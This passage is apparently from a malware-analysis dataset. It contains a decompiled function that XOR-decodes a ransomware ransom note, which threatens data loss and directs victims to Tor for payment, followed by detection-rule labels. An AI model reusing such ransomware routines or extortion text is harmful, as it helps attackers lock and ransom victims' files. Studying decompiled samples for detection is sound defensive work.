0x96) = *param_1 ^ 0x65;\n    *(param_1 + 0x97) = *param_1 ^ 100;\n    *(param_1 + 0x26) = *param_1 ^ 0x2e;\n    *(param_1 + 0x99) = *param_1 ^ 0x20;\n    *(param_1 + 0x9a) = *param_1 ^ 0x57;\n    *(param_1 + 0x9b) = *param_1 ^ 0x65;\n    *(param_1 + 0x27) = *param_1 ^ 0x20;\n    *(param_1 + 0x9d) = *param_1 ^ 0x72;\n    *(param_1 + 0x9e) = *param_1 ^ 0x65;\n    *(param_1 + 0x9f) = *param_1 ^ 99;\n    *(param_1 + 0x28) = *param_1 ^ 0x6f;\n    *(param_1 + 0xa1) = *param_1 ^ 0x6d;\n    *(param_1 + 0xa2) = *param_1 ^ 0x6d;\n    *(param_1 + 0xa3) = *param_1 ^ 0x65;\n    *(param_1 + 0x29) = *param_1 ^ 0x6e;\n    *(param_1 + 0xa5) = *param_1 ^ 100;\n    *(param_1 + 0xa6) = *param_1 ^ 0x20;\n    *(param_1 + 0xa7) = *param_1 ^ 0x75;\n    *(param_1 + 0x2a) = *param_1 ^ 0x73;\n    *(param_1 + 0xa9) = *param_1 ^ 0x69;\n    *(param_1 + 0xaa) = *param_1 ^ 0x6e;\n    *(param_1 + 0xab) = *param_1 ^ 0x67;\n    *(param_1 + 0x2b) = *param_1 ^ 0x20;\n    *(param_1 + 0xad) = *param_1 ^ 0x61;\n    *(param_1 + 0xae) = *param_1 ^ 0x20;\n    *(param_1 + 0xaf) = *param_1 ^ 0x54;\n    *(param_1 + 0x2c) = *param_1 ^ 0x6f;\n    *(param_1 + 0xb1) = *param_1 ^ 0x72;\n    *(param_1 + 0xb2) = *param_1 ^ 0x20;\n    *(param_1 + 0xb3) = *param_1 ^ 0x62;\n    *(param_1 + 0x2d) = *param_1 ^ 0x72;\n    *(param_1 + 0xb5) = *param_1 ^ 0x6f;\n    *(param_1 + 0xb6) = *param_1 ^ 0x77;\n    *(param_1 + 0xb7) = *param_1 ^ 0x73;\n    *(param_1 + 0x2e) = *param_1 ^ 0x65;\n    *(param_1 + 0xb9) = *param_1 ^ 0x72;\n    *(param_1 + 0xba) = *param_1 ^ 0x20;\n    *(param_1 + 0xbb) = *param_1 ^ 0x74;\n    *(param_1 + 0x2f) = *param_1 ^ 0x6f;\n    *(param_1 + 0xbd) = *param_1 ^ 0x20;\n    *(param_1 + 0xbe) = *param_1 ^ 0x61;\n    *(param_1 + 0xbf) = *param_1 ^ 99;\n    *(param_1 + 0x30) = *param_1 ^ 99;\n    *(param_1 + 0xc1) = *param_1 ^ 0x65;\n    *(param_1 + 0xc2) = *param_1 ^ 0x73;\n    *(param_1 + 0xc3) = *param_1 ^ 0x73;\n    *(param_1 + 0x31) = *param_1 ^ 0x20;\n    *(param_1 + 0xc5) = *param_1 ^ 0x74;\n    *(param_1 + 0xc6) = *param_1 ^ 0x68;\n    *(param_1 + 199) = *param_1 ^ 0x65;\n    *(param_1 + 0x32) = *param_1 ^ 0x20;\n    *(param_1 + 0xc9) = *param_1 ^ 0x73;\n    *(param_1 + 0xca) = *param_1 ^ 0x69;\n    *(param_1 + 0xcb) = *param_1 ^ 0x74;\n    *(param_1 + 0x33) = *param_1 ^ 0x65;\n    *(param_1 + 0xcd) = *param_1 ^ 0xd;\n    *(param_1 + 0xce) = *param_1 ^ 10;\n    *(param_1 + 0xcf) = *param_1 ^ 0x20;\n    *(param_1 + 0x34) = *param_1 ^ 0x23;\n    *(param_1 + 0xd1) = *param_1 ^ 0x20;\n    *(param_1 + 0xd2) = *param_1 ^ 0x44;\n    *(param_1 + 0xd3) = *param_1 ^ 0x6f;\n    *(param_1 + 0x35) = *param_1 ^ 0x20;\n    *(param_1 + 0xd5) = *param_1 ^ 0x6e;\n    *(param_1 + 0xd6) = *param_1 ^ 0x6f;\n    *(param_1 + 0xd7) = *param_1 ^ 0x74;\n    *(param_1 + 0x36) = *param_1 ^ 0x20;\n    *(param_1 + 0xd9) = *param_1 ^ 0x72;\n    *(param_1 + 0xda) = *param_1 ^ 0x65;\n    *(param_1 + 0xdb) = *param_1 ^ 0x6e;\n    *(param_1 + 0x37) = *param_1 ^ 0x61;\n    *(param_1 + 0xdd) = *param_1 ^ 0x6d;\n    *(param_1 + 0xde) = *param_1 ^ 0x65;\n    *(param_1 + 0xdf) = *param_1 ^ 0x20;\n    *(param_1 + 0x38) = *param_1 ^ 0x65;\n    *(param_1 + 0xe1) = *param_1 ^ 0x6e;\n    *(param_1 + 0xe2) = *param_1 ^ 99;\n    *(param_1 + 0xe3) = *param_1 ^ 0x72;\n    *(param_1 + 0x39) = *param_1 ^ 0x79;\n    *(param_1 + 0xe5) = *param_1 ^ 0x70;\n    *(param_1 + 0xe6) = *param_1 ^ 0x74;\n    *(param_1 + 0xe7) = *param_1 ^ 0x65;\n    *(param_1 + 0x3a) = *param_1 ^ 100;\n    *(param_1 + 0xe9) = *param_1 ^ 0x20;\n    *(param_1 + 0xea) = *param_1 ^ 0x66;\n    *(param_1 + 0xeb) = *param_1 ^ 0x69;\n    *(param_1 + 0x3b) = *param_1 ^ 0x6c;\n    *(param_1 + 0xed) = *param_1 ^ 0x65;\n    *(param_1 + 0xee) = *param_1 ^ 0x73;\n    *(param_1 + 0xef) = *param_1 ^ 0x2e;\n    *(param_1 + 0x3c) = *param_1 ^ 0xd;\n    *(param_1 + 0xf1) = *param_1 ^ 10;\n    *(param_1 + 0xf2) = *param_1 ^ 0x20;\n    *(param_1 + 0xf3) = *param_1 ^ 0x23;\n    *(param_1 + 0x3d) = *param_1 ^ 0x20;\n    *(param_1 + 0xf5) = *param_1 ^ 0x44;\n    *(param_1 + 0xf6) = *param_1 ^ 0x6f;\n    *(param_1 + 0xf7) = *param_1 ^ 0x20;\n    *(param_1 + 0x3e) = *param_1 ^ 0x6e;\n    *(param_1 + 0xf9) = *param_1 ^ 0x6f;\n    *(param_1 + 0xfa) = *param_1 ^ 0x74;\n    *(param_1 + 0xfb) = *param_1 ^ 0x20;\n    *(param_1 + 0x3f) = *param_1 ^ 0x74;\n    *(param_1 + 0xfd) = *param_1 ^ 0x72;\n    *(param_1 + 0xfe) = *param_1 ^ 0x79;\n    *(param_1 + 0xff) = *param_1 ^ 0x20;\n    *(param_1 + 0x40) = *param_1 ^ 0x74;\n    *(param_1 + 0x101) = *param_1 ^ 0x6f;\n    *(param_1 + 0x102) = *param_1 ^ 0x20;\n    *(param_1 + 0x103) = *param_1 ^ 100;\n    *(param_1 + 0x41) = *param_1 ^ 0x65;\n    *(param_1 + 0x105) = *param_1 ^ 99;\n    *(param_1 + 0x106) = *param_1 ^ 0x72;\n    *(param_1 + 0x107) = *param_1 ^ 0x79;\n    *(param_1 + 0x42) = *param_1 ^ 0x70;\n    *(param_1 + 0x109) = *param_1 ^ 0x74;\n    *(param_1 + 0x10a) = *param_1 ^ 0x20;\n    *(param_1 + 0x10b) = *param_1 ^ 0x75;\n    *(param_1 + 0x43) = *param_1 ^ 0x73;\n    *(param_1 + 0x10d) = *param_1 ^ 0x69;\n    *(param_1 + 0x10e) = *param_1 ^ 0x6e;\n    *(param_1 + 0x10f) = *param_1 ^ 0x67;\n    *(param_1 + 0x44) = *param_1 ^ 0x20;\n    *(param_1 + 0x111) = *param_1 ^ 0x74;\n    *(param_1 + 0x112) = *param_1 ^ 0x68;\n    *(param_1 + 0x113) = *param_1 ^ 0x69;\n    *(param_1 + 0x45) = *param_1 ^ 0x72;\n    *(param_1 + 0x115) = *param_1 ^ 100;\n    *(param_1 + 0x116) = *param_1 ^ 0x20;\n    *(param_1 + 0x117) = *param_1 ^ 0x70;\n    *(param_1 + 0x46) = *param_1 ^ 0x61;\n    *(param_1 + 0x119) = *param_1 ^ 0x72;\n    *(param_1 + 0x11a) = *param_1 ^ 0x74;\n    *(param_1 + 0x11b) = *param_1 ^ 0x79;\n    *(param_1 + 0x47) = *param_1 ^ 0x20;\n    *(param_1 + 0x11d) = *param_1 ^ 0x73;\n    *(param_1 + 0x11e) = *param_1 ^ 0x6f;\n    *(param_1 + 0x11f) = *param_1 ^ 0x66;\n    *(param_1 + 0x48) = *param_1 ^ 0x74;\n    *(param_1 + 0x121) = *param_1 ^ 0x77;\n    *(param_1 + 0x122) = *param_1 ^ 0x61;\n    *(param_1 + 0x123) = *param_1 ^ 0x72;\n    *(param_1 + 0x49) = *param_1 ^ 0x65;\n    *(param_1 + 0x125) = *param_1 ^ 0x2c;\n    *(param_1 + 0x126) = *param_1 ^ 0x20;\n    *(param_1 + 0x127) = *param_1 ^ 0x69;\n    *(param_1 + 0x4a) = *param_1 ^ 0x74;\n    *(param_1 + 0x129) = *param_1 ^ 0x20;\n    *(param_1 + 0x12a) = *param_1 ^ 0x6d;\n    *(param_1 + 299) = *param_1 ^ 0x61;\n    *(param_1 + 0x4b) = *param_1 ^ 0x79;\n    *(param_1 + 0x12d) = *param_1 ^ 0x20;\n    *(param_1 + 0x12e) = *param_1 ^ 99;\n    *(param_1 + 0x12f) = *param_1 ^ 0x61;\n    *(param_1 + 0x4c) = *param_1 ^ 0x75;\n    *(param_1 + 0x131) = *param_1 ^ 0x73;\n    *(param_1 + 0x132) = *param_1 ^ 0x65;\n    *(param_1 + 0x133) = *param_1 ^ 0x20;\n    *(param_1 + 0x4d) = *param_1 ^ 0x70;\n    *(param_1 + 0x135) = *param_1 ^ 0x65;\n    *(param_1 + 0x136) = *param_1 ^ 0x72;\n    *(param_1 + 0x137) = *param_1 ^ 0x6d;\n    *(param_1 + 0x4e) = *param_1 ^ 0x61;\n    *(param_1 + 0x139) = *param_1 ^ 0x6e;\n    *(param_1 + 0x13a) = *param_1 ^ 0x65;\n    *(param_1 + 0x13b) = *param_1 ^ 0x6e;\n    *(param_1 + 0x4f) = *param_1 ^ 0x74;\n    *(param_1 + 0x13d) = *param_1 ^ 0x20;\n    *(param_1 + 0x13e) = *param_1 ^ 100;\n    *(param_1 + 0x13f) = *param_1 ^ 0x61;\n    *(param_1 + 0x50) = *param_1 ^ 0x74;\n    *(param_1 + 0x141) = *param_1 ^ 0x61;\n    *(param_1 + 0x142) = *param_1 ^ 0x20;\n    *(param_1 + 0x143) = *param_1 ^ 0x6c;\n    *(param_1 + 0x51) = *param_1 ^ 0x6f;\n    *(param_1 + 0x145) = *param_1 ^ 0x73;\n    *(param_1 + 0x146) = *param_1 ^ 0x73;\n    *(param_1 + 0x147) = *param_1 ^ 0x2e;\n    *(param_1 + 0x52) = *param_1 ^ 0xd;\n    *(param_1 + 0x149) = *param_1 ^ 10;\n    *(param_1 + 0x14a) = *param_1 ^ 0x20;\n    *(param_1 + 0x14b) = *param_1 ^ 0x23;\n    *(param_1 + 0x53) = *param_1 ^ 0x20;\n    *(param_1 + 0x14d) = *param_1 ^ 0x44;\n    *(param_1 + 0x14e) = *param_1 ^ 0x65;\n    *(param_1 + 0x14f) = *param_1 ^ 99;\n    *(param_1 + 0x54) = *param_1 ^ 0x72;\n    *(param_1 + 0x151) = *param_1 ^ 0x79;\n    *(param_1 + 0x152) = *param_1 ^ 0x70;\n    *(param_1 + 0x153) = *param_1 ^ 0x74;\n    *(param_1 + 0x55) = *param_1 ^ 0x69;\n    *(param_1 + 0x155) = *param_1 ^ 0x6f;\n    *(param_1 + 0x156) = *param_1 ^ 0x6e;\n    *(param_1 + 0x157) = *param_1 ^ 0x20;\n    *(param_1 + 0x56) = *param_1 ^ 0x6f;\n    *(param_1 + 0x159) = *param_1 ^ 0x66;\n    *(param_1 + 0x15a) = *param_1 ^ 0x20;\n    *(param_1 + 0x15b) = *param_1 ^ 0x79;\n    *(param_1 + 0x57) = *param_1 ^ 0x6f;\n    *(param_1 + 0x15d) = *param_1 ^ 0x75;\n    *(param_1 + 0x15e) = *param_1 ^ 0x72;\n    *(param_1 + 0x15f) = *param_1 ^ 0x20;\n    *(param_1 + 0x58) = *param_1 ^ 0x66;\n    *(param_1 + 0x161) = *param_1 ^ 0x69;\n    *(param_1 + 0x162) = *param_1 ^ 0x6c;\n    *(param_1 + 0x163) = *param_1 ^ 0x65;\n    *(param_1 + 0x59) = *param_1 ^ 0x73;\n    *(param_1 + 0x165) = *param_1 ^ 0x20;\n    *(param_1 + 0x166) = *param_1 ^ 0x77;\n    *(param_1 + 0x167) = *param_1 ^ 0x69;\n    *(param_1 + 0x5a) = *param_1 ^ 0x74;\n    *(param_1 + 0x169) = *param_1 ^ 0x68;\n    *(param_1 + 0x16a) = *param_1 ^ 0x20;\n    *(param_1 + 0x16b) = *param_1 ^ 0x74;\n    *(param_1 + 0x5b) = *param_1 ^ 0x68;\n    *(param_1 + 0x16d) = *param_1 ^ 0x65;\n    *(param_1 + 0x16e) = *param_1 ^ 0x20;\n    *(param_1 + 0x16f) = *param_1 ^ 0x68;\n    *(param_1 + 0x5c) = *param_1 ^ 0x65;\n    *(param_1 + 0x171) = *param_1 ^ 0x6c;\n    *(param_1 + 0x172) = *param_1 ^ 0x70;\n    *(param_1 + 0x173) = *param_1 ^ 0x20;\n    *(param_1 + 0x5d) = *param_1 ^ 0x6f;\n    *(param_1 + 0x175) = *param_1 ^ 0x66;\n    *(param_1 + 0x176) = *param_1 ^ 0x20;\n    *(param_1 + 0x177) = *param_1 ^ 0x74;\n    *(param_1 + 0x5e) = *param_1 ^ 0x68;\n    *(param_1 + 0x179) = *param_1 ^ 0x69;\n    *(param_1 + 0x17a) = *param_1 ^ 0x72;\n    *(param_1 + 0x17b) = *param_1 ^ 100;\n    *(param_1 + 0x5f) = *param_1 ^ 0x20;\n    *(param_1 + 0x17d) = *param_1 ^ 0x70;\n    *(param_1 + 0x17e) = *param_1 ^ 0x61;\n    *(param_1 + 0x17f) = *param_1 ^ 0x72;\n    *(param_1 + 0x60) = *param_1 ^ 0x74;\n    *(param_1 + 0x181) = *param_1 ^ 0x69;\n    *(param_1 + 0x182) = *param_1 ^ 0x65;\n    *(param_1 + 0x183) = *param_1 ^ 0x73;\n    *(param_1 + 0x61) = *param_1 ^ 0x20;\n    *(param_1 + 0x185) = *param_1 ^ 0x6d;\n    *(param_1 + 0x186) = *param_1 ^ 0x61;\n    *(param_1 + 0x187) = *param_1 ^ 0x79;\n    *(param_1 + 0x62) = *param_1 ^ 0x20;\n    *(param_1 + 0x189) = *param_1 ^ 99;\n    *(param_1 + 0x18a) = *param_1 ^ 0x61;\n    *(param_1 + 0x18b) = *param_1 ^ 0x75;\n    *(param_1 + 99) = *param_1 ^ 0x73;\n    *(param_1 + 0x18d) = *param_1 ^ 0x65;\n    *(param_1 + 0x18e) = *param_1 ^ 0x20;\n    *(param_1 + 399) = *param_1 ^ 0x69;\n    *(param_1 + 100) = *param_1 ^ 0x6e;\n    *(param_1 + 0x191) = *param_1 ^ 99;\n    *(param_1 + 0x192) = *param_1 ^ 0x72;\n    *(param_1 + 0x193) = *param_1 ^ 0x65;\n    *(param_1 + 0x65) = *param_1 ^ 0x61;\n    *(param_1 + 0x195) = *param_1 ^ 0x73;\n    *(param_1 + 0x196) = *param_1 ^ 0x65;\n    *(param_1 + 0x197) = *param_1 ^ 100;\n    *(param_1 + 0x66) = *param_1 ^ 0x20;\n    *(param_1 + 0x199) = *param_1 ^ 0x70;\n    *(param_1 + 0x19a) = *param_1 ^ 0x72;\n    *(param_1 + 0x19b) = *param_1 ^ 0x69;\n    *(param_1 + 0x67) = *param_1 ^ 99;\n    *(param_1 + 0x19d) = *param_1 ^ 0x65;\n    *(param_1 + 0x19e) = *param_1 ^ 0x28;\n    *(param_1 + 0x19f) = *param_1 ^ 0x74;\n    *(param_1 + 0x68) = *param_1 ^ 0x68;\n    *(param_1 + 0x1a1) = *param_1 ^ 0x65;\n    *(param_1 + 0x1a2) = *param_1 ^ 0x79;\n    *(param_1 + 0x1a3) = *param_1 ^ 0x20;\n    *(param_1 + 0x69) = *param_1 ^ 0x61;\n    *(param_1 + 0x1a5) = *param_1 ^ 100;\n    *(param_1 + 0x1a6) = *param_1 ^ 100;\n    *(param_1 + 0x1a7) = *param_1 ^ 0x20;\n    *(param_1 + 0x6a) = *param_1 ^ 0x74;\n    *(param_1 + 0x1a9) = *param_1 ^ 0x68;\n    *(param_1 + 0x1aa) = *param_1 ^ 0x65;\n    *(param_1 + 0x1ab) = *param_1 ^ 0x69;\n    *(param_1 + 0x6b) = *param_1 ^ 0x72;\n    *(param_1 + 0x1ad) = *param_1 ^ 0x20;\n    *(param_1 + 0x1ae) = *param_1 ^ 0x66;\n    *(param_1 + 0x1af) = *param_1 ^ 0x65;\n    *(param_1 + 0x6c) = *param_1 ^ 0x65;\n    *(param_1 + 0x1b1) = *param_1 ^ 0x20;\n    *(param_1 + 0x1b2) = *param_1 ^ 0x74;\n    *(param_1 + 0x1b3) = *param_1 ^ 0x6f;\n    *(param_1 + 0x6d) = *param_1 ^ 0x20;\n    *(param_1 + 0x1b5) = *param_1 ^ 0x6f;\n    *(param_1 + 0x1b6) = *param_1 ^ 0x75;\n    *(param_1 + 0x1b7) = *param_1 ^ 0x72;\n    *(param_1 + 0x6e) = *param_1 ^ 0x29;\n    *(param_1 + 0x1b9) = *param_1 ^ 0x2e;\n    *(param_1 + 0x1ba) = *param_1 ^ 0xd;\n    *(param_1 + 0x1bb) = *param_1 ^ 10;\n    *(param_1 + 0x6f) = *param_1 ^ 0x20;\n    *(param_1 + 0x1bd) = *param_1 ^ 0x23;\n    *(param_1 + 0x1be) = *param_1 ^ 0x20;\n    *(param_1 + 0x1bf) = *param_1 ^ 0x54;\n    *(param_1 + 0x70) = *param_1 ^ 0x6f;\n    *(param_1 + 0x1c1) = *param_1 ^ 0x72;\n    *(param_1 + 0x1c2) = *param_1 ^ 0x20;\n    *(param_1 + 0x1c3) = *param_1 ^ 0x42;\n    *(param_1 + 0x71) = *param_1 ^ 0x72;\n    *(param_1 + 0x1c5) = *param_1 ^ 0x6f;\n    *(param_1 + 0x1c6) = *param_1 ^ 0x77;\n    *(param_1 + 0x1c7) = *param_1 ^ 0x73;\n    *(param_1 + 0x72) = *param_1 ^ 0x65;\n    *(param_1 + 0x1c9) = *param_1 ^ 0x72;\n    *(param_1 + 0x1ca) = *param_1 ^ 0x20;\n    *(param_1 + 0x1cb) = *param_1 ^ 0x6d;\n    *(param_1 + 0x73) = *param_1 ^ 0x61;\n    *(param_1 + 0x1cd) = *param_1 ^ 0x79;\n    *(param_1 + 0x1ce) = *param_1 ^ 0x20;\n    *(param_1 + 0x1cf) = *param_1 ^ 0x62;\n    *(param_1 + 0x74) = *param_1 ^ 0x65;\n    *(param_1 + 0x1d1) = *param_1 ^ 0x20;\n    *(param_1 + 0x1d2) = *param_1 ^ 0x62;\n    *(param_1 + 0x1d3) = *param_1 ^ 0x6c;\n    *(param_1 + 0x75) = *param_1 ^ 0x6f;\n    *(param_1 + 0x1d5) = *param_1 ^ 99;\n    *(param_1 + 0x1d6) = *param_1 ^ 0x6b;\n    *(param_1 + 0x1d7) = *param_1 ^ 0x65;\n    *(param_1 + 0x76) = *param_1 ^ 100;\n    *(param_1 + 0x1d9) = *param_1 ^ 0x20;\n    *(param_1 + 0x1da) = *param_1 ^ 0x69;\n    *(param_1 + 0x1db) = *param_1 ^ 0x6e;\n    *(param_1 + 0x77) = *param_1 ^ 0x20;\n    *(param_1 + 0x1dd) = *param_1 ^ 0x79;\n    *(param_1 + 0x1de) = *param_1 ^ 0x6f;\n    *(param_1 + 0x1df) = *param_1 ^ 0x75;\n    *(param_1 + 0x78) = *param_1 ^ 0x72;\n    *(param_1 + 0x1e1) = *param_1 ^ 0x20;\n    *(param_1 + 0x1e2) = *param_1 ^ 99;\n    *(param_1 + 0x1e3) = *param_1 ^ 0x6f;\n    *(param_1 + 0x79) = *param_1 ^ 0x75;\n    *(param_1 + 0x1e5) = *param_1 ^ 0x6e;\n    *(param_1 + 0x1e6) = *param_1 ^ 0x74;\n    *(param_1 + 0x1e7) = *param_1 ^ 0x72;\n    *(param_1 + 0x7a) = *param_1 ^ 0x79;\n    *(param_1 + 0x1e9) = *param_1 ^ 0x20;\n    *(param_1 + 0x1ea) = *param_1 ^ 0x6f;\n    *(param_1 + 0x1eb) = *param_1 ^ 0x72;\n    *(param_1 + 0x7b) = *param_1 ^ 0x20;\n    *(param_1 + 0x1ed) = *param_1 ^ 99;\n    *(param_1 + 0x1ee) = *param_1 ^ 0x6f;\n    *(param_1 + 0x1ef) = *param_1 ^ 0x72;\n    *(param_1 + 0x7c) = *param_1 ^ 0x70;\n    *(param_1 + 0x1f1) = *param_1 ^ 0x6f;\n    *(param_1 + 0x1f2) = *param_1 ^ 0x72;\n    *(param_1 + 499) = *param_1 ^ 0x61;\n    *(param_1 + 0x7d) = *param_1 ^ 0x74;\n    *(param_1 + 0x1f5) = *param_1 ^ 0x65;\n    *(param_1 + 0x1f6) = *param_1 ^ 0x20;\n    *(param_1 + 0x1f7) = *param_1 ^ 0x6e;\n    *(param_1 + 0x7e) = *param_1 ^ 0x65;\n    *(param_1 + 0x1f9) = *param_1 ^ 0x74;\n    *(param_1 + 0x1fa) = *param_1 ^ 0x77;\n    *(param_1 + 0x1fb) = *param_1 ^ 0x6f;\n    *(param_1 + 0x7f) = *param_1 ^ 0x72;\n    *(param_1 + 0x1fd) = *param_1 ^ 0x6b;\n    *(param_1 + 0x1fe) = *param_1 ^ 0x2e;\n    *(param_1 + 0x1ff) = *param_1 ^ 0x20;\n    *(param_1 + 0x80) = *param_1 ^ 0x55;\n    *(param_1 + 0x201) = *param_1 ^ 0x73;\n    *(param_1 + 0x202) = *param_1 ^ 0x65;\n    *(param_1 + 0x203) = *param_1 ^ 0x20;\n    *(param_1 + 0x81) = *param_1 ^ 0x68;\n    *(param_1 + 0x205) = *param_1 ^ 0x74;\n    *(param_1 + 0x206) = *param_1 ^ 0x74;\n    *(param_1 + 0x207) = *param_1 ^ 0x70;\n    *(param_1 + 0x82) = *param_1 ^ 0x73;\n    *(param_1 + 0x209) = *param_1 ^ 0x3a;\n    *(param_1 + 0x20a) = *param_1 ^ 0x2f;\n    *(param_1 + 0x20b) = *param_1 ^ 0x2f;\n    *(param_1 + 0x83) = *param_1 ^ 0x62;\n    *(param_1 + 0x20d) = *param_1 ^ 0x72;\n    *(param_1 + 0x20e) = *param_1 ^ 0x69;\n    *(param_1 + 0x20f) = *param_1 ^ 100;\n    *(param_1 + 0x84) = *param_1 ^ 0x67;\n    *(param_1 + 0x211) = *param_1 ^ 0x65;\n    *(param_1 + 0x212) = *param_1 ^ 0x73;\n    *(param_1 + 0x213) = *param_1 ^ 0x2e;\n    *(param_1 + 0x85) = *param_1 ^ 0x74;\n    *(param_1 + 0x215) = *param_1 ^ 0x6f;\n    *(param_1 + 0x216) = *param_1 ^ 0x72;\n    *(param_1 + 0x217) = *param_1 ^ 0x70;\n    *(param_1 + 0x86) = *param_1 ^ 0x72;\n    *(param_1 + 0x219) = *param_1 ^ 0x6f;\n    *(param_1 + 0x21a) = *param_1 ^ 0x6a;\n    *(param_1 + 0x21b) = *param_1 ^ 0x65;\n    *(param_1 + 0x87) = *param_1 ^ 99;\n    *(param_1 + 0x21d) = *param_1 ^ 0x74;\n    *(param_1 + 0x21e) = *param_1 ^ 0x2e;\n    *(param_1 + 0x21f) = *param_1 ^ 0x6f;\n    *(param_1 + 0x88) = *param_1 ^ 0x72;\n    *(param_1 + 0x221) = *param_1 ^ 0x67;\n    *(param_1 + 0x222) = *param_1 ^ 0x20;\n    *(param_1 + 0x223) = *param_1 ^ 0x6f;\n    *(param_1 + 0x89) = *param_1 ^ 0x72;\n    *(param_1 + 0x225) = *param_1 ^ 0x20;\n    *(param_1 + 0x226) = *param_1 ^ 0x75;\n    *(param_1 + 0x227) = *param_1 ^ 0x73;\n    *(param_1 + 0x8a) = *param_1 ^ 0x65;\n    *(param_1 + 0x229) = *param_1 ^ 0x20;\n    *(param_1 + 0x22a) = *param_1 ^ 0x54;\n    *(param_1 + 0x22b) = *param_1 ^ 0x6f;\n    *(param_1 + 0x8b) = *param_1 ^ 0x72;\n    *(param_1 + 0x22d) = *param_1 ^ 0x20;\n    *(param_1 + 0x22e) = *param_1 ^ 0x42;\n    *(param_1 + 0x22f) = *param_1 ^ 0x72;\n    *(param_1 + 0x8c) = *param_1 ^ 0x6f;\n    *(param_1 + 0x231) = *param_1 ^ 0x77;\n    *(param_1 + 0x232) = *param_1 ^ 0x73;\n    *(param_1 + 0x233) = *param_1 ^ 0x65;\n    *(param_1 + 0x8d) = *param_1 ^ 0x72;\n    *(param_1 + 0x235) = *param_1 ^ 0x20;\n    *(param_1 + 0x236) = *param_1 ^ 0x6f;\n    *(param_1 + 0x237) = *param_1 ^ 0x76;\n    *(param_1 + 0x8e) = *param_1 ^ 0x65;\n    *(param_1 + 0x239) = *param_1 ^ 0x72;\n    *(param_1 + 0x23a) = *param_1 ^ 0x20;\n    *(param_1 + 0x23b) = *param_1 ^ 0x56;\n    *(param_1 + 0x8f) = *param_1 ^ 0x50;\n    *(param_1 + 0x23d) = *param_1 ^ 0x4e;\n    *(param_1 + 0x23e) = *param_1 ^ 0x2e;\n    *(param_1 + 0x23f) = *param_1 ^ 0xd;\n    *(param_1 + 0x90) = *param_1 ^ 10;\n    *(param_1 + 0x241) = *param_1 ^ 0x20;\n    *(param_1 + 0x242) = *param_1 ^ 0x23;\n    *(param_1 + 0x243) = *param_1 ^ 0x20;\n    *(param_1 + 0x91) = *param_1 ^ 0x54;\n    *(param_1 + 0x245) = *param_1 ^ 0x6f;\n    *(param_1 + 0x246) = *param_1 ^ 0x72;\n    *(param_1 + 0x247) = *param_1 ^ 0x20;\n    *(param_1 + 0x92) = *param_1 ^ 0x42;\n    *(param_1 + 0x249) = *param_1 ^ 0x72;\n    *(param_1 + 0x24a) = *param_1 ^ 0x6f;\n    *(param_1 + 0x24b) = *param_1 ^ 0x77;\n    *(param_1 + 0x93) = *param_1 ^ 0x73;\n    *(param_1 + 0x24d) = *param_1 ^ 0x65;\n    *(param_1 + 0x24e) = *param_1 ^ 0x72;\n    *(param_1 + 0x24f) = *param_1 ^ 0x20;\n    *(param_1 + 0x94) = *param_1 ^ 0x75;\n    *(param_1 + 0x251) = *param_1 ^ 0x73;\n    *(param_1 + 0x252) = *param_1 ^ 0x65;\n    *(param_1 + 0x253) = *param_1 ^ 0x72;\n    *(param_1 + 0x95) = *param_1 ^ 0x20;\n    *(param_1 + 0x255) = *param_1 ^ 0x6d;\n    *(param_1 + 0x256) = *param_1 ^ 0x61;\n    *(param_1 + 599) = *param_1 ^ 0x6e;\n    *(param_1 + 0x96) = *param_1 ^ 0x75;\n    *(param_1 + 0x259) = *param_1 ^ 0x61;\n    *(param_1 + 0x25a) = *param_1 ^ 0x6c;\n    *(param_1 + 0x25b) = *param_1 ^ 0x20;\n    *(param_1 + 0x97) = *param_1 ^ 0x68;\n    *(param_1 + 0x25d) = *param_1 ^ 0x74;\n    *(param_1 + 0x25e) = *param_1 ^ 0x74;\n    *(param_1 + 0x25f) = *param_1 ^ 0x70;\n    *(param_1 + 0x98) = *param_1 ^ 0x73;\n    *(param_1 + 0x261) = *param_1 ^ 0x3a;\n    *(param_1 + 0x262) = *param_1 ^ 0x2f;\n    *(param_1 + 0x263) = *param_1 ^ 0x2f;\n    *(param_1 + 0x99) = *param_1 ^ 0x74;\n    *(param_1 + 0x265) = *param_1 ^ 0x62;\n    *(param_1 + 0x266) = *param_1 ^ 0x2d;\n    *(param_1 + 0x267) = *param_1 ^ 0x6d;\n    *(param_1 + 0x9a) = *param_1 ^ 0x61;\n    *(param_1 + 0x269) = *param_1 ^ 0x6e;\n    *(param_1 + 0x26a) = *param_1 ^ 0x75;\n    *(param_1 + 0x26b) = *param_1 ^ 0x61;\n    *(param_1 + 0x9b) = *param_1 ^ 0x6c;\n    *(param_1 + 0x26d) = *param_1 ^ 0x2e;\n    *(param_1 + 0x26e) = *param_1 ^ 0x74;\n    *(param_1 + 0x26f) = *param_1 ^ 0x6f;\n    *(param_1 + 0x9c) = *param_1 ^ 0x72;\n    *(param_1 + 0x271) = *param_1 ^ 0x70;\n    *(param_1 + 0x272) = *param_1 ^ 0x72;\n    *(param_1 + 0x273) = *param_1 ^ 0x6f;\n    *(param_1 + 0x9d) = *param_1 ^ 0x6a;\n    *(param_1 + 0x275) = *param_1 ^ 0x65;\n    *(param_1 + 0x276) = *param_1 ^ 99;\n    *(param_1 + 0x277) = *param_1 ^ 0x74;\n    *(param_1 + 0x9e) = *param_1 ^ 0x2e;\n    *(param_1 + 0x279) = *param_1 ^ 0x6f;\n    *(param_1 + 0x27a) = *param_1 ^ 0x72;\n    *(param_1 + 0x27b) = *param_1 ^ 0x67;\n    *(param_1 + 0x9f) = *param_1 ^ 0x2f;\n    *(param_1 + 0x27d) = *param_1 ^ 0x61;\n    *(param_1 + 0x27e) = *param_1 ^ 0x62;\n    *(param_1 + 0x27f) = *param_1 ^ 0x6f;\n    *(param_1 + 0xa0) = *param_1 ^ 0x75;\n    *(param_1 + 0x281) = *param_1 ^ 0x74;\n    *(param_1 + 0x282) = 0;\n    return param_1;\n}\n",
        "token_count": 12724
    },
    "00406bb0": {
        "rules": [
            "enumerate PE sections/0325759584d940e7b69154ed16836be2",
            "enumerate PE sections/e92b906b5db4485ea433dde72854611a"
        ],
